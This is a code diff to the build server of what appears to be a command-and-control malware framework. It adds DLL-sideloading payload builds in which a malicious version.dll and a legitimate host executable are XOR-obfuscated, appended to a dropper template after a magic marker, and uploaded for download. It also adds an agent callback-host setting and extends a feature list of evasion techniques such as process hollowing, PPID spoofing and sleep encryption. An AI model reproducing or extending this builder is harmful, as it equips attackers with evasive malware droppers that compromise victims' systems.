@@ -65,22 +65,24 @@ func (g *gateway) handleCreateBuild(w http.ResponseWriter, r *http.Request) {
 		cfg.TargetArch = "x64"
 	}
 
-	// Resolve listener host/port from DB.
-	// bind_host is the server-side listen address (often 0.0.0.0); agents need a
-	// routable callback address, so we fall back to 127.0.0.1 (host loopback via
-	// Docker port-mapping) when the bind address is not specific.
-	// For cross-network testing, set a real hostname or IP in the listener's bind_host field.
+	// Resolve listener callback address for agent baking.
+	// callback_host is the public/routable address agents dial; bind_host is what
+	// the server actually listens on (often 0.0.0.0). Fall back through:
+	//   callback_host → bind_host (if specific) → 127.0.0.1 (dev/Docker loopback)
 	listenerHost := "127.0.0.1"
 	listenerPort := 4443
 	if cfg.ListenerID != "" {
-		var host string
+		var bindHost, callbackHost string
 		var port int
 		err := db.Pool.QueryRow(r.Context(),
-			`SELECT bind_host, bind_port FROM listeners WHERE id = $1`, cfg.ListenerID,
-		).Scan(&host, &port)
+			`SELECT bind_host, COALESCE(callback_host,''), bind_port FROM listeners WHERE id = $1`, cfg.ListenerID,
+		).Scan(&bindHost, &callbackHost, &port)
 		if err == nil {
-			if host != "" && host != "0.0.0.0" {
-				listenerHost = host
+			switch {
+			case callbackHost != "":
+				listenerHost = callbackHost
+			case bindHost != "" && bindHost != "0.0.0.0":
+				listenerHost = bindHost
 			}
 			listenerPort = port
 		}
@@ -231,7 +233,7 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 			"ppid-spoof": true, "heap-encrypt": true, "stack-spoof": true,
 			"udrl": true, "staged-payload": true, "self-delete": true,
 			"channel-tcp": true, "channel-smb": true, "sleep-encrypt": true,
-			"process-hollow": true, "pack-stager": true,
+			"process-hollow": true, "pack-stager": true, "dll-sideload": true,
 		}
 		var validated []string
 		for _, f := range features {
@@ -241,6 +243,20 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 		}
 		if len(validated) > 0 {
 			featuresArg = strings.Join(validated, ",")
+		}
+	}
+
+	isDLL := strings.Contains(featuresArg, "dll-sideload")
+
+	sideloadExe := os.Getenv("DM_SIDELOAD_EXE")
+	if sideloadExe == "" {
+		sideloadExe = "/sideload/Setup.exe"
+	}
+	if isDLL {
+		if _, err := os.Stat(sideloadExe); err != nil {
+			g.log.Error("sideload EXE not found — copy it first", zap.String("path", sideloadExe))
+			setBuildStatus("failed", "", "")
+			return
 		}
 	}
 
@@ -269,7 +285,7 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 		// DM_BIN must match the cargo output so the Dockerfile cp succeeds.
 		payloadArgs := makeAgentBuildArgs(payloadImageTag, cargoTarget, binName, c2Host, c2Port,
 			regPath, pollPath, sleepSecs, jitterPct, buildID, tlsSkipVerifyStr, userAgent,
-			sleepEncryptStr, payloadFeatures, campaignID, false, "")
+			sleepEncryptStr, payloadFeatures, campaignID, false, "", false, "")
 
 		payloadCmd := exec.CommandContext(ctx, "docker", payloadArgs...)
 		payloadCmd.Env = append(os.Environ(), "DOCKER_BUILDKIT=1")
@@ -318,9 +334,17 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 		stagerFeatures = buildStagerFeatures(featuresArg)
 	}
 
+	if signSubject != "" && !strings.HasPrefix(signSubject, "/") {
+		parts := strings.Split(signSubject, ",")
+		for i, p := range parts {
+			parts[i] = strings.TrimSpace(p)
+		}
+		signSubject = "/" + strings.Join(parts, "/")
+	}
+
 	buildArgs := makeAgentBuildArgs(imageTag, cargoTarget, binName, c2Host, c2Port,
 		regPath, pollPath, sleepSecs, jitterPct, buildID, tlsSkipVerifyStr, userAgent,
-		sleepEncryptStr, stagerFeatures, campaignID, packStager, signSubject)
+		sleepEncryptStr, stagerFeatures, campaignID, packStager, signSubject, isDLL, sideloadExe)
 
 	buildCmd := exec.CommandContext(ctx, "docker", buildArgs...)
 	buildCmd.Env = append(os.Environ(), "DOCKER_BUILDKIT=1")
@@ -332,8 +356,67 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 		return
 	}
 
-	// When packing, the operator artifact is dm-stub.exe; dm-agent.exe is the raw
-	// stager embedded inside the stub and is discarded after the build.
+	if isDLL {
+		// DLL sideload: extract DLL + dropper template, inject payload in Go, upload dropper EXE.
+		dllTmp := "/artifacts/" + buildID + "-dll.tmp"
+		dropperTmp := "/artifacts/" + buildID + "-dropper.tmp"
+		extractCmd := exec.CommandContext(ctx,
+			"docker", "run", "--rm",
+			"-v", buildVolume+":/out",
+			imageTag, "sh", "-c",
+			"cp /version.dll /out/"+buildID+"-dll.tmp && cp /dm-dropper.exe /out/"+buildID+"-dropper.tmp",
+		)
+		if err := extractCmd.Run(); err != nil {
+			g.log.Error("docker extract (dll) failed", zap.String("build_id", buildID), zap.Error(err))
+			setBuildStatus("failed", "", "")
+			return
+		}
+		exec.Command("docker", "rmi", imageTag).Run() //nolint
+
+		dllBytes, err := os.ReadFile(dllTmp)
+		os.Remove(dllTmp)
+		if err != nil {
+			g.log.Error("read dll artifact", zap.String("build_id", buildID), zap.Error(err))
+			setBuildStatus("failed", "", "")
+			return
+		}
+		templateBytes, err := os.ReadFile(dropperTmp)
+		os.Remove(dropperTmp)
+		if err != nil {
+			g.log.Error("read dropper template", zap.String("build_id", buildID), zap.Error(err))
+			setBuildStatus("failed", "", "")
+			return
+		}
+		setupBytes, err := os.ReadFile(sideloadExe)
+		if err != nil {
+			g.log.Error("read sideload exe", zap.String("path", sideloadExe), zap.Error(err))
+			setBuildStatus("failed", "", "")
+			return
+		}
+
+		dropper := buildDropper(templateBytes, dllBytes, setupBytes)
+		outPath := "/artifacts/" + buildID + ext
+		if err := os.WriteFile(outPath, dropper, 0644); err != nil {
+			g.log.Error("write dropper", zap.String("build_id", buildID), zap.Error(err))
+			setBuildStatus("failed", "", "")
+			return
+		}
+		artifactURL, err := storage.UploadFile(ctx, storage.BucketArtifacts, buildID+ext, outPath, contentType)
+		os.Remove(outPath)
+		if err != nil {
+			g.log.Error("minio upload dropper", zap.String("build_id", buildID), zap.Error(err))
+			setBuildStatus("failed", "", "")
+			return
+		}
+		downloadURL, _ := storage.PresignedDownloadURL(ctx, storage.BucketArtifacts, buildID+ext)
+		if downloadURL == "" {
+			downloadURL = artifactURL
+		}
+		setBuildStatus("complete", downloadURL, "")
+		g.log.Info("dropper build complete", zap.String("build_id", buildID))
+		return
+	}
+
 	extractBin := binName
 	if packStager {
 		extractBin = "dm-stub" + ext
@@ -371,14 +454,62 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 	os.Remove(outPath)
 }
 
+const dropperMagic = "DMSDRPX!"
+
+// buildDropper appends XOR-encrypted DLL and host EXE to the dropper template
+// using the magic marker the template searches for at runtime.
+func buildDropper(template, dll, hostExe []byte) []byte {
+	encDLL := xorPackBytes(dll)
+	encEXE := xorPackBytes(hostExe)
+
+	out := make([]byte, 0, len(template)+8+4+len(encDLL)+4+len(encEXE))
+	out = append(out, template...)
+	out = append(out, []byte(dropperMagic)...)
+	out = appendU32LE(out, uint32(len(encDLL)))
+	out = append(out, encDLL...)
+	out = appendU32LE(out, uint32(len(encEXE)))
+	out = append(out, encEXE...)
+	return out
+}
+
+func xorPackBytes(data []byte) []byte {
+	if len(data) == 0 {
+		return []byte{0, 0, 0, 0}
+	}
+	seed := uint32(len(data)) ^
+		uint32(data[0]) ^
+		(uint32(data[len(data)-1]) << 8)
+	key := [4]byte{
+		byte(seed >> 24),
+		byte(seed>>16) ^ 0xA3,
+		byte(seed>>8) ^ 0x7F,
+		byte(seed) ^ 0x5C,
+	}
+	result := make([]byte, 4+len(data))
+	copy(result[:4], key[:])
+	for i, b := range data {
+		result[4+i] = b ^ key[i%4]
+	}
+	return result
+}
+
+func appendU32LE(b []byte, v uint32) []byte {
+	return append(b, byte(v), byte(v>>8), byte(v>>16), byte(v>>24))
+}
+
 func makeAgentBuildArgs(imageTag, cargoTarget, binName, c2Host, c2Port,
 	regPath, pollPath string, sleepSecs, jitterPct int,
 	buildID, tlsSkipVerify, userAgent, sleepEncrypt, features, campaignID string,
-	packStager bool, signSubject string) []string {
+	packStager bool, signSubject string, isDLL bool, sideloadExe string) []string {
 
 	packStr := "false"
 	if packStager {
 		packStr = "true"
+	}
+
+	dllStr := "false"
+	if isDLL {
+		dllStr = "true"
 	}
 
 	args := []string{
@@ -400,6 +531,7 @@ func makeAgentBuildArgs(imageTag, cargoTarget, binName, c2Host, c2Port,
 		"--build-arg", "DM_FEATURES=" + features,
 		"--build-arg", "DM_PACK_STAGER=" + packStr,
 		"--build-arg", "DM_SIGN_SUBJECT=" + signSubject,
+		"--build-arg", "DM_DLL_BUILD=" + dllStr,
 	}
 	if campaignID != "" && campaignID != "00000000-0000-0000-0000-000000000000" {
 		args = append(args, "--build-arg", "DM_CAMPAIGN_ID="+campaignID)
